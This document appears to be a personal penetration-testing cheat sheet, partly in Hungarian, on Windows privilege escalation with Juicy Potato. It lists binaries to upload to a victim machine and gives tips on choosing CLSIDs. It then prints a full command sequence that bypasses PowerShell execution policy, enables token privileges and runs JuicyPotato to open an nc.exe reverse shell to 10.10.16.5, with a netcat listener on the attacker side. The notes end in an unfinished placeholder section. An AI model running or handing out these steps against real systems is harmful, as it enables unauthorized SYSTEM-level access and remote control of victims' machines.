# Win privesc techniques
## Juicy Potato
* Needed scripts from github (all of them need to be uploaded to the victim machine)
  * JuicyPotato binaries
    * https://github.com/ohpe/juicy-potato
  * ncat binaries
    * https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
  * Enable privileges
    * ez nem mukodott
      * https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1
    * ez mukodott
      * https://www.leeholmes.com/adjusting-token-privileges-in-powershell/
* Eloszor futtassuk a JuicyPotato binary-t uresen. Ki kell hogy adja e help menut.
* Utana parameteresen futtassuk
  * Ha hiba van, erdemes megnezni egyesevel a cmd es nc binary-kat az absolute uttal, hogy jok e
  * Ha COM recv hiba van, akkor masik clsid-t probaljunk meg
    * Minden oprendszer verziohoz kulon vannak, itt talalhatok
      * https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
    * Valasszuk ki a megfelelo oprendszer verziot, es ott 4-5 darabot probaljunk meg a clsid-k kozul, valamelyiknek mukodnie kell
<pre>
<b># victim machine</b>
PS> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
PS> Import-Module .\EnableAllTokenPrivs.ps1
PS> Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
PS> whoami /priv (most mar elvileg Enabled lett)
PS> .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\downloads\nc.exe 10.10.16.5 5555 -e c:\windows\system32\cmd.exe" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"

<b># attack machine</b>
$ nc -nvlp 5555
</pre>
## Host enumeration
### Host enumeration with WMIC
|a|b|c
+-+-+-+
|aaa|bbb|ccc|
|111|222|333|
### Host enumeration with 
